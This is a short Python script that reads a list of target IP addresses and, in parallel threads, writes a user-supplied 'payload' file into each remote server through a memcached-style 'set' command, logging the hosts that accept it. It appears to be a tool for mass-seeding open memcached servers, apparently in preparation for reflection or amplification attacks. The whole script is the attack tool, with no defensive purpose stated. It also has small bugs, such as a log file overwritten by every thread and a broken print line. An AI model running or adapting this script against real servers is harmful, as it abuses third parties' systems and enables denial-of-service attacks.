# coding: utf-8

import socket
import os
import threading


# 读取ip_list 发送tcp set
#   成功 保存 set_list.txt

def TCP_set(IP, port, var_name, path):
    # 创建socket链接
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client.settimeout(10.0)

    try:

        client.connect((IP, int(port)))

    except Exception as e:

        print(IP + "  --------  is fail")

        return

    # 得到length字段
    length = os.path.getsize(path)

    with open(path, 'r') as file:

        string = file.read()

    # 发送的内容
    data = "set " + var_name + " 1 0 " + str(length) + "\r\n" + string + "\r\n\r\n\r\n\r\n\r\n"

    client.send(data)

    # 超时
    try:

        data = client.recv(1024)

    except:

        print("  --------  is fail ")

        return

    else:

        if "STORED" in data:
            with open('set_list.txt', 'w') as outfile:
                outfile.write(IP + '\n')

        print(IP + "--------is ok ")

    finally:

        client.close()


def Set():
    path = input('input the path of target Ip file:')

    var_name = input('input the var_name:')

    payload = input('input the path of payload file:')

    port = input('input the target port:')

    with open(path, 'r') as ips:
        for ip in ips:
            ip = ip.strip('\n')
            print
            ip
            thread = threading.Thread(target=TCP_set, args=(ip, port, var_name, payload))

            thread.start()


def main():
    Set()


if __name__ == '__main__':
    main()